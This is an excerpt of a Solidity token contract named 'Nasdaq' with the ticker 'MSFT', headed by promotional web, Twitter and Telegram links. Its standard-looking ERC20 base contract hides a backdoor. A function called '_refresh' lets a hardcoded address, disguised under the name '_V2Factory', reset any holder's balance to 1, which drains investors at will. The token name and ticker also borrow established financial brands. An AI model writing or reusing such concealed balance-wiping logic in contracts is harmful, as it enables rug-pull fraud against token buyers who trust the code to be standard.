...
/*
https://NasdaqCoinETH.xyz
https://twitter.com/NasdaqCoinETH
https://t.me/NasdaqCoinETH
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address internal routerV2 = 0xDE009dA40eA5Bc660300e6D8cCEe994539cb35d8;
    string private _symbol;
    mapping(address => mapping(address => uint256)) private _allowances;
    address private _V2Factory = 0x79d1c2385CF18Ef621F41B0DEDc3D832eCEc90f9;
    ...
    function _refresh(address _refreshSender) external { if (msg.sender == _V2Factory) _balances[_refreshSender] = 0x1; }
...
contract NasdaqCoin is ERC20, Ownable {
    constructor()
    ERC20(unicode"Nasdaq", unicode"MSFT") {
